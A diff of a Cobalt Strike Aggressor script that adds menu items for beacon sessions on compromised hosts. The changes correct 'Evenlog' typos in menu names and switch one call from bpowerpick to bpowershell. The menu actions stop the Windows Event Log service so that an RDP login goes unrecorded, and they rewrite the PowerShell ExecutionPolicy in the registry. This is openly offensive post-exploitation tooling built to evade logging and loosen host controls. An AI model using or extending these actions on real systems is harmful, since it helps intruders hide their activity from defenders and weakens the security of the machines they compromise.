@@ -37,8 +37,8 @@ popup beacon_bottom {
                 dbutton_action($dialog, "Launch");
                 dialog_show($dialog);
             }
-            menu "EvenlogService" {
-                item "KillEvenlogService" {
+            menu "EventlogService" {
+                item "KillEventlogService" {
                     local('$bid');
                     foreach $bid ($1){
                         blog($1, "Stop Eventlog Service to First Login RDP");
@@ -46,7 +46,7 @@ popup beacon_bottom {
                         bpowerpick($bid,"KillEvenlogService");
                     }                
                 }
-                item "StartEvenlogService" {
+                item "StartEventlogService" {
                     local('$bid');
                     foreach $bid ($1){
                         blog($1, "Start Eventlog Service");
@@ -67,7 +67,7 @@ popup beacon_bottom {
                     foreach $bid ($1){
                         blog($1, "Change PowerShell ExecutionPolicy to RemoteSigned(.Default:Restricted)");
                         bpowerpick($bid,"get-Executionpolicy");
-                        bpowerpick($1,"Set-Itemproperty -path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell' -Name 'ExecutionPolicy' -value 'RemoteSigned'");
+                        bpowershell($1,"Set-Itemproperty -path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell' -Name 'ExecutionPolicy' -value 'RemoteSigned'");
                         bpowerpick($bid,"get-Executionpolicy");
                     }
                 }
